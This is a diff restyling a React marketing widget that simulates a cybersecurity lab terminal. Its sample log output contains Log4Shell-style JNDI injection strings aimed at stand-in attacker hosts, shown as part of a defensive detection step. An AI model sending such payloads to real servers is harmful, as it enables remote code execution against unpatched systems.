@@ -1,13 +1,10 @@
 import React, { useState } from 'react';
 import { 
-  Terminal as TerminalIcon, 
   Play, 
   RefreshCw, 
   CheckCircle2, 
   ExternalLink,
-  Cpu,
-  Clock,
-  Layers
+  Cpu
 } from 'lucide-react';
 
 const SCENARIOS = [
@@ -21,8 +18,8 @@ const SCENARIOS = [
     steps: [
       {
         cmd: 'grep -E "(\\$\\{|jndi:)" /var/log/apache2/access.log | head -n 3',
-        output: `192.168.1.104 - - [13/Nov/2026:11:42:01] "GET /login?user=\${jndi:ldap://bad-actor.net/a} HTTP/1.1" 200 452
-192.168.1.104 - - [13/Nov/2026:11:42:04] "GET /api?q=\${jndi:dns://attacker.org/test} HTTP/1.1" 200 128
+        output: `192.168.1.104 - - [17/Nov/2026:05:32:01] "GET /login?user=\${jndi:ldap://bad-actor.net/a} HTTP/1.1" 200 452
+192.168.1.104 - - [17/Nov/2026:05:32:04] "GET /api?q=\${jndi:dns://attacker.org/test} HTTP/1.1" 200 128
 [DETECTION] JNDI string injection verified in URI parameters.`,
         desc: 'Extract malicious JNDI string injections from raw web access logs.'
       },
@@ -103,33 +100,33 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
   };
 
   return (
-    <section id="labs" className="py-20 bg-[#090D16] border-t border-slate-800 relative">
+    <section id="labs" className="py-20 bg-white border-b border-slate-200 relative">
       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
         
         {/* Section Header */}
         <div className="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-6">
           <div className="space-y-2 max-w-2xl">
-            <span className="text-xs font-mono font-bold tracking-wider uppercase text-emerald-400">
+            <span className="text-xs font-mono font-bold tracking-wider uppercase text-emerald-800 bg-emerald-50 px-2.5 py-1 rounded-md border border-emerald-200 inline-block">
               Interactive Lab Sandbox
             </span>
-            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
+            <h2 className="text-3xl sm:text-4xl font-extrabold text-slate-900 tracking-tight">
               Test Real Commands. See Real Outputs.
             </h2>
-            <p className="text-sm text-slate-300">
+            <p className="text-sm text-slate-600">
               Experience the actual workflow of a Cybrary lab. Click through the guided steps below to run authentic attack and defense operations.
             </p>
           </div>
 
-          {/* Scenario Selector Pills */}
-          <div className="flex items-center gap-1.5 bg-slate-900 p-1 rounded-lg border border-slate-800">
+          {/* Scenario Selector */}
+          <div className="flex items-center gap-1.5 bg-slate-100 p-1.5 rounded-xl border border-slate-200">
             {SCENARIOS.map((sc, i) => (
               <button
                 key={sc.id}
                 onClick={() => handleSwitch(i)}
-                className={`px-3 py-1.5 rounded text-xs font-medium transition-all ${
+                className={`px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                   activeScenarioIdx === i
-                    ? 'bg-emerald-500 text-slate-950 font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-white'
+                    ? 'bg-white text-slate-900 font-bold shadow-2xs border border-slate-200/80'
+                    : 'text-slate-600 hover:text-slate-900'
                 }`}
               >
                 {sc.name.split(':')[0]}
@@ -138,15 +135,15 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
           </div>
         </div>
 
-        {/* The Sandbox Interface Card */}
-        <div className="rounded-xl bg-slate-900 border border-slate-700 shadow-xl overflow-hidden">
+        {/* The Sandbox Interface Card - Light Themed */}
+        <div className="rounded-2xl bg-white border border-slate-200 shadow-md overflow-hidden">
           
           {/* Header */}
-          <div className="bg-slate-950 px-5 py-3 border-b border-slate-800 flex flex-wrap items-center justify-between gap-4 text-xs font-mono">
+          <div className="bg-slate-100 px-5 py-3.5 border-b border-slate-200 flex flex-wrap items-center justify-between gap-4 text-xs font-mono text-slate-800">
             <div className="flex items-center space-x-3">
-              <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
+              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
               <div>
-                <span className="text-white font-bold">{scenario.name}</span>
+                <span className="font-bold text-emerald-800">{scenario.name}</span>
                 <span className="text-slate-500 ml-2">({scenario.environment})</span>
               </div>
             </div>
@@ -154,14 +151,14 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
             <div className="flex items-center space-x-3">
               <button
                 onClick={handleReset}
-                className="flex items-center gap-1 text-slate-400 hover:text-white px-2.5 py-1 rounded bg-slate-900 border border-slate-800 text-[11px] transition-colors"
+                className="flex items-center gap-1.5 text-slate-700 hover:text-slate-950 px-2.5 py-1 rounded bg-white border border-slate-200 text-[11px] transition-colors shadow-2xs font-medium"
               >
-                <RefreshCw className="w-3 h-3" />
+                <RefreshCw className="w-3 h-3 text-slate-500" />
                 <span>Reset</span>
               </button>
               <button
                 onClick={() => onOpenAuth('signup')}
-                className="flex items-center gap-1 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold px-3 py-1 rounded text-[11px] transition-colors"
+                className="flex items-center gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold px-3 py-1 rounded text-[11px] transition-colors shadow-2xs"
               >
                 <span>Unlock All 1,250+ Labs</span>
                 <ExternalLink className="w-3 h-3" />
@@ -169,24 +166,24 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
             </div>
           </div>
 
-          {/* Body Split */}
-          <div className="grid grid-cols-1 lg:grid-cols-12 divide-y lg:divide-y-0 lg:divide-x divide-slate-800">
+          {/* Body Split View */}
+          <div className="grid grid-cols-1 lg:grid-cols-12 divide-y lg:divide-y-0 lg:divide-x divide-slate-200">
             
             {/* Left Steps Progression */}
-            <div className="lg:col-span-5 p-6 space-y-4 bg-slate-900/80">
+            <div className="lg:col-span-5 p-6 space-y-4 bg-slate-50/70">
               <div className="flex items-center justify-between text-xs">
-                <span className="font-semibold text-slate-200">
+                <span className="font-bold text-slate-900">
                   Lab Objectives ({currentStepIdx + 1} of {scenario.steps.length})
                 </span>
-                <span className="text-emerald-400 font-mono font-bold">
+                <span className="text-emerald-800 font-mono font-bold bg-emerald-100 px-2 py-0.5 rounded border border-emerald-200">
                   {Math.round(((currentStepIdx + 1) / scenario.steps.length) * 100)}% Complete
                 </span>
               </div>
 
               {/* Progress Bar */}
-              <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
+              <div className="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
                 <div 
-                  className="bg-emerald-400 h-full transition-all duration-300"
+                  className="bg-emerald-600 h-full transition-all duration-300"
                   style={{ width: `${((currentStepIdx + 1) / scenario.steps.length) * 100}%` }}
                 ></div>
               </div>
@@ -199,29 +196,29 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
                   return (
                     <div
                       key={i}
-                      className={`p-3 rounded-lg border text-xs transition-colors ${
+                      className={`p-3.5 rounded-xl border text-xs transition-colors ${
                         isCurrent
-                          ? 'bg-slate-950 border-emerald-500/40'
+                          ? 'bg-white border-emerald-400 shadow-2xs'
                           : isDone
-                            ? 'bg-slate-950/60 border-slate-800/80 text-slate-400'
-                            : 'bg-slate-950/30 border-transparent text-slate-500'
+                            ? 'bg-white/80 border-slate-200 text-slate-600'
+                            : 'bg-white/40 border-slate-200/60 text-slate-400'
                       }`}
                     >
                       <div className="flex items-start space-x-2.5">
                         <div className={`mt-0.5 rounded-full p-0.5 ${
                           isDone 
-                            ? 'bg-emerald-500/20 text-emerald-400' 
+                            ? 'bg-emerald-100 text-emerald-700' 
                             : isCurrent 
-                              ? 'bg-emerald-400 text-slate-950' 
-                              : 'bg-slate-800 text-slate-500'
+                              ? 'bg-emerald-600 text-white' 
+                              : 'bg-slate-200 text-slate-500'
                         }`}>
                           <CheckCircle2 className="w-3.5 h-3.5" />
                         </div>
                         <div>
-                          <div className={`font-semibold ${isCurrent ? 'text-white' : 'text-slate-300'}`}>
+                          <div className={`font-bold ${isCurrent ? 'text-slate-900' : 'text-slate-700'}`}>
                             Step {i + 1}: {st.cmd.split(' ')[0]}
                           </div>
-                          <div className="text-[11px] text-slate-400 mt-0.5 leading-relaxed">
+                          <div className="text-[11px] text-slate-500 mt-0.5 leading-relaxed">
                             {st.desc}
                           </div>
                         </div>
@@ -231,29 +228,29 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
                 })}
               </div>
 
-              {/* Action */}
+              {/* Action Button */}
               <div className="pt-2">
                 {currentStepIdx < scenario.steps.length - 1 ? (
                   <button
                     onClick={handleNextStep}
                     disabled={isExecuting}
-                    className="w-full py-2.5 px-4 rounded-lg font-bold text-xs text-slate-950 bg-emerald-400 hover:bg-emerald-300 transition-colors flex items-center justify-center gap-2"
+                    className="w-full py-2.5 px-4 rounded-xl font-bold text-xs text-white bg-emerald-600 hover:bg-emerald-700 shadow-xs transition-colors flex items-center justify-center gap-2"
                   >
                     {isExecuting ? 'Executing script...' : (
                       <>
-                        <Play className="w-3.5 h-3.5 fill-slate-950" />
+                        <Play className="w-3.5 h-3.5 fill-white" />
                         <span>Run Next Lab Objective</span>
                       </>
                     )}
                   </button>
                 ) : (
-                  <div className="p-3 rounded-lg bg-emerald-950/30 border border-emerald-900/50 text-center space-y-1">
-                    <div className="text-xs font-bold text-emerald-400">
+                  <div className="p-3.5 rounded-xl bg-emerald-50 border border-emerald-200 text-center space-y-1">
+                    <div className="text-xs font-bold text-emerald-800">
                       ✓ Lab Completed! Verification Successful.
                     </div>
                     <button
                       onClick={() => onOpenAuth('signup')}
-                      className="text-[11px] text-slate-300 hover:text-white underline font-medium"
+                      className="text-[11px] text-emerald-700 hover:underline font-semibold"
                     >
                       Try Full 7-Day Access to All 1,250+ Hands-On Labs →
                     </button>
@@ -262,39 +259,39 @@ export default function InteractiveLabDemo({ onOpenAuth }) {
               </div>
             </div>
 
-            {/* Right Terminal Console */}
-            <div className="lg:col-span-7 bg-[#070B14] p-5 font-mono text-xs flex flex-col justify-between">
+            {/* Right Terminal Console - Light Theme */}
+            <div className="lg:col-span-7 bg-white p-5 font-mono text-xs flex flex-col justify-between">
               <div className="space-y-4">
-                <div className="flex items-center justify-between text-[11px] text-slate-500 border-b border-slate-800 pb-2">
+                <div className="flex items-center justify-between text-[11px] text-slate-400 border-b border-slate-100 pb-2">
                   <span>kali@cybrary-box: /workspace</span>
-                  <span>SSH-2.0-OpenSSH_9.0</span>
+                  <span className="text-emerald-700 font-medium">SSH-2.0-OpenSSH_9.0</span>
                 </div>
 
                 <div className="space-y-3">
                   {scenario.steps.slice(0, currentStepIdx + 1).map((st, i) => (
                     <div key={i} className="space-y-1">
-                      <div className="text-emerald-400 flex items-center gap-1.5 font-semibold">
-                        <span className="text-slate-500">root@cybrary:~#</span>
-                        <span>{st.cmd}</span>
+                      <div className="text-emerald-700 flex items-center gap-1.5 font-semibold">
+                        <span className="text-slate-400">root@cybrary:~#</span>
+                        <span className="text-slate-900 font-bold">{st.cmd}</span>
                       </div>
-                      <pre className="text-slate-300 bg-slate-900/60 p-3 rounded border border-slate-800 text-[11px] whitespace-pre-wrap leading-relaxed">
+                      <pre className="text-slate-700 bg-slate-50 p-3 rounded-xl border border-slate-200 text-[11px] whitespace-pre-wrap leading-relaxed font-mono">
                         {st.output}
                       </pre>
                     </div>
                   ))}
 
                   {isExecuting && (
-                    <div className="text-slate-400 flex items-center gap-2 text-[11px]">
-                      <span className="animate-spin text-emerald-400">●</span>
+                    <div className="text-slate-500 flex items-center gap-2 text-[11px]">
+                      <span className="animate-spin text-emerald-600">●</span>
                       <span>Processing command in container...</span>
                     </div>
                   )}
                 </div>
               </div>
 
-              <div className="mt-6 pt-3 border-t border-slate-800 flex items-center justify-between text-[11px] text-slate-400">
+              <div className="mt-6 pt-3 border-t border-slate-200 flex items-center justify-between text-[11px] text-slate-500">
                 <span className="flex items-center gap-1.5">
-                  <Cpu className="w-3.5 h-3.5 text-emerald-400" /> Dedicated Container Isolation
+                  <Cpu className="w-3.5 h-3.5 text-emerald-600" /> Dedicated Container Isolation
                 </span>
                 <span>Latency: 8ms</span>
               </div>
